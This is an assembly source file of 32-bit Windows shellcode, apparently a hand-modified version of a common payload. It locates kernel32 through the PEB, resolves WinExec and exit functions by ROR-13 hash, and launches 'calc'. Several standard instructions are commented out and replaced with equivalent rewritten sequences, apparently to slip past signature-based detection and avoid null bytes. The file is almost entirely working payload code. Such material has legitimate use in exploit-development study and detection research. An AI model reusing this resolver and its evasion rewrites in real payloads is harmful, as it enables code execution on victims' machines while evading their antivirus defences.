BITS 32

Start:

DB 0x90

   cld

   ;call    sub_88

   jmp SHORT around

before:

   jmp SHORT lab_pre88

around:

   call before

  

START_MATH:   

; ---------------------------------------------------------------------------

   pusha

   mov     ebp, esp

   xor     eax, eax

   mov     edx, fs:[eax+30h]

   mov     edx, [edx+0Ch]

   mov     edx, [edx+14h]

loc_15:                                 ; CODE XREF: seg000:00000086↓j

   mov     esi, [edx+28h]

   ;movzx   ecx, word [edx+26h]

   mov     edi, edx

   add     edi, 0x28

   sub     edi, 0x2

   movzx   ecx, word [edi]

   xor     edi, edi

loc_1E:                                 ; CODE XREF: seg000:0000002A↓j

   lodsb

   ;cmp     al, 61h ; 'a'

mov	bl,50h

add	bl, 11h

cmp	al,bl

   ;jl      short loc_25

jge	SkipLess
jmp	short loc_25

   sub     al, 20h ; ' '

SkipLess:

loc_25:                                 ; CODE XREF: seg000:00000021↑j

   ;ror     edi, 0Dh

push ecx

mov	cl,50

sub	cl,37

ror	edi,cl

xor	cl,cl

pop	ecx

   add     edi, eax

   loop    loc_1E

   push    edx

   push    edi

   mov     edx, [edx+10h]

   ;mov     ecx, [edx+3Ch]

push 	30h
pop	edi
add	edi,0ch
mov	ecx,[edx+edi]
xor	edi,edi

   mov     ecx, [ecx+edx+78h]

   jecxz   loc_82

   add     ecx, edx

   push    ecx

   mov     ebx, [ecx+20h]

   add     ebx, edx

   mov     ecx, [ecx+18h]

   jmp short loc_45

lab_pre88:

   jmp sub_88


loc_45:                                 ; CODE XREF: seg000:0000005F↓j

   jecxz   loc_81

   dec     ecx

   mov     esi, [ebx+ecx*4]

   add     esi, edx

   xor     edi, edi

loc_4F:                                 ; CODE XREF: seg000:00000057↓j

   lodsb

   ;ror     edi, 0Dh

push ecx

mov	cl,50

sub	cl,37

ror	edi,cl

xor	cl,cl

pop	ecx

   add     edi, eax

   cmp     al, ah

   jnz     short loc_4F

   add     edi, [ebp-8]

   cmp     edi, [ebp+24h]

   jnz     short loc_45

   pop     eax

   mov     ebx, [eax+24h]

   add     ebx, edx

   mov     cx, [ebx+ecx*2]

   mov     ebx, [eax+1Ch]

   add     ebx, edx

   mov     eax, [ebx+ecx*4]

   add     eax, edx

   mov     [esp+24h], eax

   pop     ebx

   pop     ebx

;tried jmp start from here, didnt work

   popa

   pop     ecx

   pop     edx

   push    ecx

   jmp     eax

; ---------------------------------------------------------------------------

jmp 	Start

loc_81:

   pop     edi

loc_82:

   pop     edi

   pop     edx

   mov     edx, [edx]

   jmp     loc_15;changed from short

; =============== S U B R O U T I N E =======================================

; Attributes: noreturn

sub_88:

   pop     ebp

   push    1

   ;lea     eax, [ebp+0B2h]

   ;lea     eax, [ebp+(END_MATH-START_MATH)]
XOR EAX,EAX
add al, (END_MATH-START_MATH)
add eax,ebp

dec byte [eax+4]

   push    eax

   push    876F8B31h

   call    ebp

   mov     ebx, 0EA320EFEh

   push    9DBD95A6h

   call    ebp

   ;cmp al,6

mov cl,6

cmp     al, cl

   ;jl      short loc_B3

jge	Skipnow
jmp	short loc_B3

   cmp     bl, 0E0h

   jnz     short loc_B3

   mov     ebx, 6F721347h

nop;to extend jmp to loc b3
nop

Skipnow:


loc_B3:

   ;push    0
push edx

   push    ebx

   call    ebp

END_MATH:

   DB 'c', 'a', 'l', 'c',1



;supposed to be a zero with this but i got rid of it and it still works so
;¯\_(ツ)_/¯
